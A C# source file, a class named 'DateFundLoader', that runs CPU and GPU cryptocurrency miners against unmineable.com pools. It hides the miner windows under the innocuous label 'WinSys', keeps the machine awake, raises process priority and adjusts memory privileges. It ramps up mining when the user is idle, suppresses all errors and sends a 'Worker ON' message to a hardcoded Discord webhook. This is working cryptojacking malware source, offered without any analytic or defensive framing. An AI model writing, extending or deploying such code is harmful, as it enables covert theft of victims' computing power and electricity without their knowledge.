using System;
using System.Diagnostics;
using System.Net;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

public class DateFundLoader {

    [StructLayout(LayoutKind.Sequential)]
    struct LASTINPUTINFO {
        public static readonly int SizeOf = Marshal.SizeOf(typeof(LASTINPUTINFO));
        [MarshalAs(UnmanagedType.U4)]
        public int cbSize;
        [MarshalAs(UnmanagedType.U4)]
        public uint dwTime;
    }

    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    static extern uint SetThreadExecutionState(uint esFlags);

    // P/Invoke for System Privileges (Huge Pages / MSR)
    [DllImport("advapi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

    [StructLayout(LayoutKind.Sequential)]
    struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID_AND_ATTRIBUTES Privileges; }

    [StructLayout(LayoutKind.Sequential)]
    struct LUID_AND_ATTRIBUTES { public LUID Luid; public uint Attributes; }

    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    private const uint TOKEN_QUERY = 0x0008;

    private const uint ES_CONTINUOUS = 0x80000000;
    private const uint ES_SYSTEM_REQUIRED = 0x00000001;
    private const uint ES_AWAYMODE_REQUIRED = 0x00000040;

    private const string IDENT = "WinSys";
    private const int IDLE_THRESHOLD_MS = 30000; // 30 seconds for maximum money

    public static void StartMiner(string cpuPath, string gpuPath, string wallet) {
        try {
            SetThreadExecutionState(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
            TryEnableHugePages(); // Money Maker Optimization
            NotifyDiscord(wallet);

            Thread manager = new Thread(() => RunManager(cpuPath, gpuPath, wallet));
            manager.IsBackground = true;
            manager.Start();

            Thread.Sleep(Timeout.Infinite);
        } catch { }
    }

    private static void TryEnableHugePages() {
        try {
            IntPtr tokenHandle;
            if (OpenProcessToken(Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle)) {
                LUID luid;
                if (LookupPrivilegeValue(null, "SeLockMemoryPrivilege", out luid)) {
                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES {
                        PrivilegeCount = 1,
                        Privileges = new LUID_AND_ATTRIBUTES { Luid = luid, Attributes = SE_PRIVILEGE_ENABLED }
                    };
                    AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                }
            }
        } catch { }
    }

    private static void RunManager(string cpuPath, string gpuPath, string wallet) {
        Process cpuProc = null;
        Process gpuProc = null;
        bool wasIdle = false;

        while (true) {
            try {
                bool isIdle = GetIdleTime() > IDLE_THRESHOLD_MS;
                string machine = Environment.MachineName.Replace(" ", "_");

                if (isIdle != wasIdle || cpuProc == null || cpuProc.HasExited) {
                    if (cpuProc != null && !cpuProc.HasExited) { try { cpuProc.Kill(); } catch { } }
                    
                    int threads = isIdle ? 100 : 60;
                    string cpuArgs = string.Format("-o rx.unmineable.com:3333 -u BTC:{0}.{1}_{2}_CPU -p x --donate-level 1 --cpu-max-threads-hint {3}", wallet, IDENT, machine, threads);
                    
                    ProcessStartInfo si = new ProcessStartInfo(cpuPath) {
                        Arguments = cpuArgs,
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    cpuProc = Process.Start(si);
                    try { cpuProc.PriorityClass = ProcessPriorityClass.High; } catch { } // Greed Mode Priority
                }

                if (!string.IsNullOrEmpty(gpuPath) && File.Exists(gpuPath)) {
                    if (isIdle != wasIdle || gpuProc == null || gpuProc.HasExited) {
                        if (gpuProc != null && !gpuProc.HasExited) { try { gpuProc.Kill(); } catch { } }

                        int intensity = isIdle ? 100 : 60;
                        string gpuArgs = string.Format("--algo ETCHASH --server etchash.unmineable.com:3333 --user BTC:{0}.{1}_{2}_GPU --pass x --intensity {3}", wallet, IDENT, machine, intensity);

                        ProcessStartInfo si = new ProcessStartInfo(gpuPath) {
                            Arguments = gpuArgs,
                            CreateNoWindow = true,
                            UseShellExecute = false,
                            WindowStyle = ProcessWindowStyle.Hidden
                        };
                        gpuProc = Process.Start(si);
                        try { gpuProc.PriorityClass = ProcessPriorityClass.High; } catch { } // Greed Mode Priority
                    }
                }
                
                wasIdle = isIdle;
            } catch { }
            Thread.Sleep(5000);
        }
    }

    private static void NotifyDiscord(string wallet) {
        try {
            string webhookUrl = "https://discord.com/api/webhooks/1495748321078284358/ZrPnFP_wT81nNxuqlsAOB9FNWrOJhK3nPGRYQJjDuH-2mIWdyNf1RK_Ql9Quf6vSgbKr";
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
            string msg = string.Format("Worker ON");
            using (WebClient wc = new WebClient()) {
                wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                wc.UploadString(webhookUrl, "{\"content\": \"" + msg + "\"}");
            }
        } catch { }
    }

    private static uint GetIdleTime() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = Marshal.SizeOf(lii);
        return GetLastInputInfo(ref lii) ? (uint)Environment.TickCount - lii.dwTime : 0;
    }
}
